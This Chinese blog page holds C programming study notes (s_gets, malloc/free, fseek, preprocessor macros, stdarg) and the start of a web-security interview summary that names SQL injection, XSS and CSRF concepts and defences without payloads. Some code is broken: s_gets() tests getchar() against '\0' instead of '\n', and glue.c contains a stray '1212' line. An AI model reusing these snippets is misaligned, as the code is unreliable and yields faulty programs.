<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;        // 提供 fgets()和getchar()的原型</span><br><span class="line">#include &lt;string.h&gt;       // 提供 strchr()的原型</span><br><span class="line">char * s_gets(char * st, int n)</span><br><span class="line">&#123;</span><br><span class="line">char * ret_val;</span><br><span class="line">char * find;</span><br><span class="line">ret_val = fgets(st, n, stdin);</span><br><span class="line">if (ret_val)</span><br><span class="line">&#123;</span><br><span class="line">find = strchr(st,  &#x27;\n&#x27;);</span><br><span class="line">if (find)		      // 如果地址不是 NULL,</span><br><span class="line">*find = &#x27;\0&#x27;;	    // 在此处放置一个空字符</span><br><span class="line">else</span><br><span class="line">while (getchar() != &#x27;\0&#x27;)</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">return ret_val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="内存分配：malloc-和-free"><a href="#内存分配：malloc-和-free" class="headerlink" title="内存分配：malloc() 和 free()"></a>内存分配：malloc() 和 free()</h2><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc()"></a>malloc()</h3><p>malloc()函数会找到合适的空闲内存块，这样的内存是匿名的。也就是说， malloc()分配内存，但是不会为其赋名。然而，它确实返回动态分配内存块的首字节地址。因此，可以把该地址赋给一个指针变量，并使用指针访问这块内存。malloc()函数可用于返回指向数组的指针、指向结构的指针等，所以通常该函数的返回值会被强制转换为匹配的类型。如果 malloc()分配内存失败，将返回空指针。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">double * ptd;</span><br><span class="line"></span><br><span class="line">ptd = (double *) malloc(30 * sizeof(double));</span><br></pre></td></tr></table></figure>
<p>以上代码为30个double类型的值请求内存空间，并设置ptd指向该位置。<br>注意，指针ptd被声明为指向一个double类型，而不是指向内含30个double类型值的块。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">double item[n];</span><br><span class="line"></span><br><span class="line">ptd = (double *) malloc(n * sizeof(double));</span><br></pre></td></tr></table></figure>
<h3 id="free"><a href="#free" class="headerlink" title="free()"></a>free()</h3><p>静态内存的数量在编译时是固定的，在程序运行期间也不会改变。自动变量使用的内存数量在程序执行期间自动增加或减少。但是动态分配的内存<br>数量只会增加，除非用 free()进行释放。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">double glad[2000];</span><br><span class="line">int i;</span><br><span class="line">...</span><br><span class="line">for (i = 0; i &lt; 1000; i++)</span><br><span class="line">gobble(glad, 2000);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">void gobble(double ar[], int n)</span><br><span class="line">&#123;</span><br><span class="line">double * temp = (double *) malloc( n * sizeof(double));</span><br><span class="line">.../* free(temp); // 假设忘记使用free() */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="calloc"><a href="#calloc" class="headerlink" title="calloc()"></a>calloc()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">long * newmem;</span><br><span class="line"></span><br><span class="line">newmem = (long *)calloc(100, sizeof (long));</span><br></pre></td></tr></table></figure>
<p>和malloc()类似，返回指向void的指针。如果要储存不同的类型，应使用强制类型转换运算符。</p>
<p>calloc()函数还有一个特性：它把块中的所有位都设置为0（注意，在某些硬件系统中，不是把所有位都设置为0来表示浮点值0）。</p>
<p>free()函数也可用于释放calloc()分配的内存。</p>
<h3 id="动态内存分配和变长数组"><a href="#动态内存分配和变长数组" class="headerlink" title="动态内存分配和变长数组"></a>动态内存分配和变长数组</h3><p>对多维数组而言，使用变长数组更方便。当然，也可以用 <code>malloc()</code> 创建二维数组，但是语法比较繁琐。如果编译器不支持变长数组特性，就只能固<br>定二维数组的维度，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int n = 5;</span><br><span class="line">int m = 6;</span><br><span class="line">int ar2[n][m]; // n×m的变长数组（VLA）</span><br><span class="line">int (* p2)[6]; // C99之前的写法</span><br><span class="line">int (* p3)[m]; // 要求支持变长数组</span><br><span class="line">p2 = (int (*)[6]) malloc(n * 6 * sizeof(int)); // n×6 数组</span><br><span class="line">p3 = (int (*)[m]) malloc(n * m * sizeof(int)); // n×m 数组（要求支持变长数组）</span><br><span class="line">ar2[1][2] = p2[1][2] = 12;</span><br></pre></td></tr></table></figure>
<p>先复习一下指针声明。由于malloc()函数返回一个指针，所以p2必须是一个指向合适类型的指针。第1个指针声明：<br><code>int (* p2)[6]; // C99之前的写法</code></p>
<p>表明p2指向一个内含6个int类型值的数组。因此，<code>p2[i]</code>代表一个由6个整数构成的元素，<code>p2[i][j]</code>代表一个整数。<br>第2个指针声明用一个变量指定p3所指向数组的大小。因此，p3代表一个指向变长数组的指针，这行代码不能在C90标准中运行。</p>
<h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen()"></a>fopen()</h2><p><img src="/image/fopen(" alt="fopen()的模式字符串">.png)</p>
<h2 id="文件结尾"><a href="#文件结尾" class="headerlink" title="文件结尾"></a>文件结尾</h2><p>为了避免读到空文件，应该使用入口条件循环（不是do while循环）。鉴于getc() （和其他C输入函数）的设计，程序应该在进入循环体之前先尝试读取。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 设计范例 #1</span><br><span class="line">int ch; // 用int类型的变量储存EOF</span><br><span class="line">FILE * fp;</span><br><span class="line">fp = fopen(&quot;wacky.txt&quot;, &quot;r&quot;);</span><br><span class="line">ch = getc(fp); // 获取初始输入</span><br><span class="line">while (ch != EOF)</span><br><span class="line">&#123;</span><br><span class="line">putchar(ch); // 处理输入</span><br><span class="line">ch = getc(fp); // 获取下一个输入</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>以上代码可简化为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 设计范例 #2</span><br><span class="line">int ch;</span><br><span class="line">FILE * fp;</span><br><span class="line">fp = fopen(&quot;wacky.txt&quot;, &quot;r&quot;);</span><br><span class="line">while (( ch = getc(fp)) != EOF)</span><br><span class="line">&#123;</span><br><span class="line">putchar(ch); //处理输入</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="fseek"><a href="#fseek" class="headerlink" title="fseek()"></a>fseek()</h2><p><img src="/image/文件的起始点模式.png" alt="文件的起始点模式"></p>
<p>fseek()的第1个参数是FILE指针，指向待查找的文件，fopen()应该已打开该文件。<br>fseek()的第2个参数是偏移量（offset）。该参数表示从起始点开始要移动的距离（参见表列出的起始点模式）。该参数必须是一个long类型的值，可以为正（前移）、负（后移）或0（保持不动）。<br>fseek()的第3个参数是模式，该参数确定起始点。</p>
<p>下面是调用fseek()函数的一些示例，fp是一个文件指针：<br>fseek(fp, 0L, SEEK_SET); // 定位至文件开始处<br>fseek(fp, 10L, SEEK_SET); // 定位至文件中的第10个字节<br>fseek(fp, 2L, SEEK_CUR); // 从文件当前位置前移2个字节<br>fseek(fp, 0L, SEEK_END); // 定位至文件结尾<br>fseek(fp, -10L, SEEK_END); // 从文件结尾处回退10个字节</p>
<p><img src="/image/文本模式调用.png" alt="文本模式调用.png"></p>
<h2 id="指针访问结构成员"><a href="#指针访问结构成员" class="headerlink" title="指针访问结构成员"></a>指针访问结构成员</h2><p>如果<code>him == &amp;fellow[0]</code>，那么<code>*him == fellow[0]</code>，因为<code>&amp;</code>和<code>*</code>是一对互逆运算符。<br>因此，可以做以下替代：<br><code>fellow[0].income == (*him).income</code><br>必须要使用圆括号，因为<code>.</code>运算符比<code>*</code>运算符的优先级高。<br>总之，如果<code>him</code>是指向<code>guy</code>类型结构<code>barney</code>的指针，下面的关系恒成立：<br><code>barney.income == (*him).income == him-&gt;income // 假设 him == &amp;barney</code></p>
<h2 id="位移运算"><a href="#位移运算" class="headerlink" title="位移运算"></a>位移运算</h2><p>移位运算符针对2的幂提供快速有效的乘法和除法：</p>
<p><code>number &lt;&lt; n</code>     number 乘以2的n次幂<br><code>number &gt;&gt; n</code>     如果number为非负，则用number除以2的n次幂</p>
<p>这些移位运算符类似于在十进制中移动小数点来乘以或除以10。</p>
<h2 id="掩码"><a href="#掩码" class="headerlink" title="掩码"></a>掩码</h2><p>因为ASCII码只使用最后7位，所以有时需要用掩码关闭其他位，其相应的二进制掩码是什么？分别用十进制、八进制和十六进制来表示这个掩码。</p>
<p>掩码的二进制是<code>1111111</code>；十进制是<code>127</code>；八进制是<code>0177</code>；十六进制是<code>0x7F</code>。</p>
<h2 id="条件编译"><a href="#条件编译" class="headerlink" title="条件编译"></a>条件编译</h2><p><code>#ifdef</code> 判断是否定义了标识符。如果定义了则执行<code>#else</code>或<code>#endif</code>指令之前的所有指令并编译所有C代码，如果未定义则执行<code>#else</code>和<code>#endif</code>指令之间的所有代码。</p>
<p><code>#ifndef</code> 判断后面的标识符是否是未定义的。通常用于防止多次包含一个文件。</p>
<p><code>#if</code>指令很像C语言中的<code>if</code>。<code>#if</code>后面跟整型常量表达式，如果表达式为非零，则表达式为真。<br>可以按照if else的形式使用<code>#elif</code>。<br>较新的编译器提供另一种方法测试名称是否已定义，即用<code>#if defined(VAX)</code>代替<code>#ifdef VAX</code>。<br>这里，defined是一个预处理运算符，如果它的参数是用<code>#defined</code>定义过，则返回<code>1</code>；否则返回<code>0</code>。这种新方法的优点是，它可以和<code>#elif</code>一起使用。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#if defined (IBMPC)</span><br><span class="line">#include &quot;ibmpc.h&quot;</span><br><span class="line">#elif defined (VAX)</span><br><span class="line">#include &quot;vax.h&quot;</span><br><span class="line">#elif defined (MAC)</span><br><span class="line">#include &quot;mac.h&quot;</span><br><span class="line">#else</span><br><span class="line">#include &quot;general.h&quot;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><br>如果在VAX机上运行这几行代码，那么应该在文件前面用下面的代码定义VAX：<br><code>#define VAX</code></p>
<h2 id="在-define-中使用参数"><a href="#在-define-中使用参数" class="headerlink" title="在 #define 中使用参数"></a>在 <code>#define</code> 中使用参数</h2><p>在#define中使用参数可以创建外形和作用与函数类似的类函数宏。带有参数的宏看上去很像函数，因为这样的宏也使用圆括号。类函数宏定义的圆括号中可以有一个或多个参数，随后这些参数出现在替换体中。</p>
<p><img src="/image/函数宏定义的组成.png" alt="函数宏定义的组成"></p>
<ul>
<li><code>#define SQUARE(X) X*X</code></li>
</ul>
<h3 id="运算符"><a href="#运算符" class="headerlink" title="#运算符"></a><code>#运算符</code></h3><p>下面是一个类函数宏：<br><code>#define PSQR(X) printf(&quot;The square of X is %d.\n&quot;, ((X)*(X)));</code><br>假设这样使用宏：<br><code>PSQR(8);</code><br>输出为：<br><code>The square of X is 64.</code><br>C允许在字符串中包含宏参数。在类函数宏的替换体中，<code>#</code>号作为一个预处理运算符，可以把记号转换成字符串。例如，如果<code>x</code>是一个宏形参，那么<code>#x</code>就是转换为字符串”x”的形参名。这个过程称为字符串化（stringizing）。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/* subst.c -- 在字符串中替换 */</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#define PSQR(x) printf(&quot;The square of &quot; #x &quot; is %d.\n&quot;,((x)*(x)))</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int y = 5;</span><br><span class="line">PSQR(y);</span><br><span class="line">PSQR(2 + 4);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">该程序的输出如下：</span><br><span class="line">The square of y is 25.</span><br><span class="line">The square of 2 + 4 is 36.</span><br></pre></td></tr></table></figure><br>调用第1个宏时，用”<code>y</code>“替换#x。调用第2个宏时，用”<code>2 + 4</code>“替换<code>#x</code>。ANSI C字符串的串联特性将这些字符串与printf()语句的其他字符串组合，生成最终的字符串。</p>
<h3 id="预处理器粘合剂：-运算符"><a href="#预处理器粘合剂：-运算符" class="headerlink" title="预处理器粘合剂：##运算符"></a>预处理器粘合剂：<code>##运算符</code></h3><p>与<code>#</code>运算符类似，<code>##</code>运算符可用于类函数宏的替换部分。而且，<code>##</code>还可用于对象宏的替换部分。<code>##</code>运算符把两个记号组合成一个记号。例如，可以这样做：<br><code>#define XNAME(n) x ## n</code><br>然后，宏<code>XNAME(4)</code>将展开为<code>x4</code>。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// glue.c -- 使用##运算符</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#define XNAME(n) x ## n</span><br><span class="line">#define PRINT_XN(n) printf(&quot;x&quot; #n &quot; = %d\n&quot;, x ## n);</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int XNAME(1) = 14; // 变成 int x1 = 14;</span><br><span class="line">int XNAME(2) = 20; // 变成 int x2 = 20;</span><br><span class="line">int x3 = 30;</span><br><span class="line">1212</span><br><span class="line">PRINT_XN(1); // 变成 printf(&quot;x1 = %d\n&quot;, x1);</span><br><span class="line">PRINT_XN(2); // 变成 printf(&quot;x2 = %d\n&quot;, x2);</span><br><span class="line">PRINT_XN(3); // 变成 printf(&quot;x3 = %d\n&quot;, x3);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">该程序的输出如下：</span><br><span class="line">x1 = 14</span><br><span class="line">x2 = 20</span><br><span class="line">x3 = 30</span><br></pre></td></tr></table></figure></p>
<ul>
<li>注意，PRINT_XN()宏用#运算符组合字符串，##运算符把记号组合为一个新的标识符。</li>
</ul>
<h3 id="变参宏：-和-VA-ARGS"><a href="#变参宏：-和-VA-ARGS" class="headerlink" title="变参宏： ...和__VA_ARGS__"></a>变参宏： <code>...</code>和<code>__VA_ARGS__</code></h3><p><code>stdvar.h</code> 头文件提供了工具，让用户自定义带可变参数的函数。<br>通过把宏参数列表中最后的参数写成省略号（即，3个点…）来实现这一功能。这样，预定义宏<code>_ _VA_ARGS_</code><em>可用在替换部分中，表明省略号代表什么。例如，下面的定义：<br>`#define PR(…) printf(</em> <em>VA_ARGS</em> _)`<br>假设稍后调用该宏：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PR(&quot;Howdy&quot;);</span><br><span class="line">PR(&quot;weight = %d, shipping = $%.2f\n&quot;, wt, sp);</span><br><span class="line">对于第1次调用，_ _VA_ARGS_ _展开为1个参数：&quot;Howdy&quot;。</span><br><span class="line">对于第2次调用，_ _VA_ARGS_ _展开为3个参数：&quot;weight = %d,</span><br><span class="line">shipping = $%.2f\n&quot;、wt、sp。</span><br></pre></td></tr></table></figure><br>因此，展开后的代码是：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Howdy&quot;);</span><br><span class="line">printf(&quot;weight = %d, shipping = $%.2f\n&quot;, wt, sp);</span><br></pre></td></tr></table></figure></p>
<h3 id="宏和函数的选择"><a href="#宏和函数的选择" class="headerlink" title="宏和函数的选择"></a>宏和函数的选择</h3><p>宏的一个优点是，不用担心变量类型（这是因为宏处理的是字符串，而不是实际的值）。<br>对于简单的函数，程序员通常使用宏，如下所示：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define MAX(X,Y) ((X) &gt; (Y) ? (X) : (Y))</span><br><span class="line">#define ABS(X) ((X) &lt; 0 ? -(X) : (X))</span><br><span class="line">#define ISSIGN(X) ((X) == &#x27;+&#x27; || (X) == &#x27;-&#x27; ? 1 : 0)</span><br></pre></td></tr></table></figure><br>（如果x是一个代数符号字符，最后一个宏的值为1，即为真。）<br>用圆括号把宏的参数和整个替换体括起来。这样能确保被括起来的部分在下面这样的表达式中正确地展开：<br><code>forks = 2 * MAX(guests + 3, last);</code><br>用大写字母表示宏函数的名称。</p>
<h2 id="预定义宏"><a href="#预定义宏" class="headerlink" title="预定义宏"></a>预定义宏</h2><p><img src="/image/预定义宏.png" alt="预定义宏"></p>
<h2 id="内联函数"><a href="#内联函数" class="headerlink" title="内联函数"></a>内联函数</h2><p>最简单的方法是使用函数说明符 <code>inline</code> 和存储类别说明符<code>static</code>。通常，内联函数应定义在首次使用它的文件中，所以内联函数也相当于函数原型。<br>编译器优化内联函数必须知道该函数定义的内容。这意味着内联函数定义与函数调用必须在同一个文件中。最简单的做法是，把内联函数定义放入头文件，并在使用该内联函数的文件中包含该头文件即可。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// eatline.h</span><br><span class="line">#ifndef EATLINE_H_</span><br><span class="line">#define EATLINE_H_</span><br><span class="line">inline static void eatline()</span><br><span class="line">&#123;</span><br><span class="line">while (getchar() != &#x27;\n&#x27;)</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><br>一般都不在头文件中放置可执行代码，内联函数是个特例。因为内联函数具有内部链接，所以在多个文件中定义同一个内联函数不会产生什么问题。</p>
<h2 id="数学库"><a href="#数学库" class="headerlink" title="数学库"></a>数学库</h2><p><img src="/image/数学库.png" alt="数学函数"></p>
<h2 id="可变参数：stdarg-h"><a href="#可变参数：stdarg-h" class="headerlink" title="可变参数：stdarg.h"></a>可变参数：<code>stdarg.h</code></h2><p>必须按如下步骤进行：</p>
<ol>
<li>提供一个使用省略号的函数原型；</li>
<li>在函数定义中创建一个va_list类型的变量；</li>
<li>用宏把该变量初始化为一个参数列表；</li>
<li>用宏访问参数列表；</li>
<li>用宏完成清理工作。</li>
</ol>
<p>因为<code>va_arg()</code>不提供退回之前参数的方法，所以有必要保存<code>va_list</code>类型变量的副本。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">va_list ap;                 // 声明一个对象储存参数</span><br><span class="line">va_list apcopy;             // 声明一个复制对象储存参数</span><br><span class="line">double</span><br><span class="line">double tic;</span><br><span class="line">int toc;</span><br><span class="line">...</span><br><span class="line">va_start(ap, lim);          // 把ap初始化为一个参数列表</span><br><span class="line">va_copy(apcopy, ap);        // 把apcopy作为ap的副本</span><br><span class="line">tic = va_arg(ap, double);   // 检索第1个参数</span><br><span class="line">toc = va_arg(ap, int);      // 检索第2个参数</span><br><span class="line">va_end(ap);                 // 清理工作</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://allofmortal.github.io/2023/05/18/%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Mortal">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/05/18/%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">بدون عنوان</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">نُشر في</span>

              <time title="أُنشأ: 2023-05-18 12:05:30" itemprop="dateCreated datePublished" datetime="2023-05-18T12:05:30+08:00">2023-05-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">عُدل في</span>
                <time title="عُدل: 2022-03-08 23:33:44" itemprop="dateModified" datetime="2022-03-08T23:33:44+08:00">2022-03-08</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="：面试总结"><a href="#：面试总结" class="headerlink" title="：面试总结"></a>：面试总结</h1><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>[TOC]</p>
<blockquote>
<p>如果你觉得我写的不够清楚，或者还有很多东西没有写。</p>
<p>那么一定是我觉得很简单不用写的内容，严格的来说，这些简答的内容，应该已经化作养分融入到了你的血液，成为了你的生物行为和习惯。</p>
<p>如果这些都不会，我觉得，就算你去忽悠面试官，你也忽悠不了。</p>
<p>所以还是老老实实学习吧。</p>
</blockquote>
<p><span style=font-size:25px;color:violet;background-color:red;>应该从喜欢里得到力量和快乐，</span><span style=font-size:20px;color:blue;background-color:black;>而不是耗尽你的所有快乐和喜欢得到力量。</span></p>
<p><span style=font-size:25px>爱一个行业和技能应该是长期的细水长流，而不是短暂的决堤崩洪。</span></p>
<h1 id="一、WEB："><a href="#一、WEB：" class="headerlink" title="一、WEB："></a>一、WEB：</h1><h2 id="1-SQL注入原理"><a href="#1-SQL注入原理" class="headerlink" title="1-SQL注入原理"></a>1-SQL注入原理</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">WEB应用程序对用户输入的数据</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">没有过滤或者过滤的不严谨</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">并且把用户输入的数据当作SQL 语句</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">带入到数据中去执行</span></span><br></pre></td></tr></table></figure>
<h2 id="2-SQL注入分类"><a href="#2-SQL注入分类" class="headerlink" title="2-SQL注入分类"></a>2-SQL注入分类</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从反馈结果来分</span></span><br><span class="line">	1-回显型</span><br><span class="line">	2-无回显型/盲注</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从攻击手法上来分</span></span><br><span class="line">	1-联合查询注入 union select</span><br><span class="line">	2-堆叠注入 ；</span><br><span class="line">	3-报错注入 updatexml、floor、ExtractValue 其他的用的不多不用说</span><br><span class="line">	4-盲注</span><br><span class="line">		4.1-布尔盲注</span><br><span class="line">		4.2-时间盲注</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
<h2 id="3-SQL注入防御"><a href="#3-SQL注入防御" class="headerlink" title="3-SQL注入防御"></a>3-SQL注入防御</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">代码层防御</span></span><br><span class="line">	1-对用户输入的内容进行转义（PHP中addslashes()、mysql_real_escape()函数）。</span><br><span class="line">	2-限制关键字的输入（PHP中preg_replace()函数正则替换关键字），限制输入的长度 。</span><br><span class="line">	3-使用SQL语句预处理，对SQL语句首先进行预编译，然后进行参数绑定，最后传入参数。</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">网络层面</span></span><br><span class="line">	部署防护墙和软硬WAF</span><br></pre></td></tr></table></figure>
<h2 id="4-XSS原理"><a href="#4-XSS原理" class="headerlink" title="4-XSS原理"></a>4-XSS原理</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1-XSS漏洞是跨站脚本攻击</span><br><span class="line">2-是HTML代码的注入</span><br><span class="line">3-他是通过对网页，注入浏览器可执行的代码，从而实现的攻击手段。</span><br></pre></td></tr></table></figure>
<h2 id="5-XSS分类"><a href="#5-XSS分类" class="headerlink" title="5-XSS分类"></a>5-XSS分类</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1-反射型</span><br><span class="line">2-存储型</span><br><span class="line">3-DOM型</span><br></pre></td></tr></table></figure>
<h2 id="6-XSS区别"><a href="#6-XSS区别" class="headerlink" title="6-XSS区别"></a>6-XSS区别</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">反射型 和 存储型</span></span><br><span class="line">	都需需要经过服务器解析，并与数据库产生交互</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">DOM 型</span></span><br><span class="line">	只需要经过前端解析，不与数据库产生交互</span><br><span class="line"><span class="meta prompt_">	</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">存储型 和 DOM型</span></span><br><span class="line">	都会将攻击代码长期存在受害者服务器</span><br><span class="line"><span class="meta prompt_">	</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> 反射型</span></span><br><span class="line">	而反射型，只会反弹一次攻击代码</span><br></pre></td></tr></table></figure>
<h2 id="7-CSRF-成功利用的条件"><a href="#7-CSRF-成功利用的条件" class="headerlink" title="7-CSRF 成功利用的条件"></a>7-CSRF 成功利用的条件</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1- 用户在统一浏览器下</span><br><span class="line">2- 没有关闭浏览器的情况下</span><br><span class="line">3- 访问了攻击者精心伪装好的恶意链接</span><br></pre></td></tr></table></figure>
